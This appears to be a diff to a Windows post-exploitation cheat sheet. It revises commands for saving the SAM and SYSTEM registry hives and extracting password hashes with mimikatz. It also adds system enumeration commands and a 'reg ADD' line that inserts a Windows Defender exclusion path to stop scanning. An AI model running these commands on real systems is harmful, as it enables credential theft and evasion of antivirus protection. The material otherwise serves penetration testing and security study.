@@ -224,14 +224,21 @@ sqldumper.exe <PID> 0 0x01100:40
 ```
 
 ### SAM and SYSTEM backup
-```bash
-$ reg save HKLM\SYSTEM SystemBkup.hiv
-$ reg save HKLM\SAM SamBkup.hiv
+
+You can dump the hives from a running Windows machine with the `reg` command:
+
+```powershell
+reg save HKLM\SYSTEM SystemBkup.hiv
+reg save HKLM\SAM SamBkup.hiv
 ```
 
-Then with `mimikatz` you can recover the hashes:
-```bash
-$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+On the hard-drive, the files are stored in `C:\Windows\System32\config`. Even
+`nt authority\system` cannot copy those files.
+
+With `mimikatz` you can recover the hashes:
+
+```powershell
+lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 ```
 
 
@@ -411,4 +418,38 @@ cached files of the process in the two directories:
 ```
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
+```
+
+
+## System information
+
+### Get system information
+
+The command `systeminfo` lists the information about the system: Hostname,
+OS version, System type, Domain, Hotfixs, network cards, ...
+
+Also, you can read the log files from `%WINDIR%\inf` to get basic info:
+
+```batch
+type %WINDIR%\inf\setupapi.setup.log
+
+[Device Install Log]
+     OS Version = 10.0.19041
+     Service Pack = 0.0
+     Suite = 0x0100
+     ProductType = 1
+     Architecture = amd64
+...
+```
+
+
+## Windows Defender
+
+### Check Defender exclusion path
+
+The registry node `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths`
+contains the exclusions paths. You can add your own to prevent scanning:
+
+```powershell
+reg ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /f /t "C:\Path\To\Exclude" /d 0
 ```
